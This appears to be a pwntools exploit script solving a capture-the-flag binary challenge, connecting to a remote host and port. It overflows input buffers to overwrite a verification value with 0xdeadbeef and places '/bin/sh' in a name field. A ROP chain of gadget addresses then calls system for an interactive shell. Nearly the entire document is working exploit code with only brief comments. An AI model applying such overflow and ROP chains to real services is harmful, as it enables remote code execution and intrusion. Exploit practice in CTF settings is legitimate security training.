from pwn import *

context(os='linux', log_level='debug', arch='amd64')

# r = process("./task")

code = ELF("./task")

r = remote("106.15.186.69",50020)

r.recvuntil("id?\n")

id_payload = "a" * 16 + p64(0xdeadbeef)
#Put in the character for verification 0xdeadbeef

r.send(id_payload)

r.recvuntil("name?\n")

name_payload = "pore\n\0/bin/sh" 
# Put in the check character and put /bin/sh

r.send(name_payload)

shell_payload = "b" * 32 + \
    p64(0x4005a9) + p64(0x4008f3) + p64(code.symbols['name']+6) + p64(0x400856)
# ret seize a seat + pop %edi + /bin/sh addresse + call system  

r.send(shell_payload)

r.interactive()
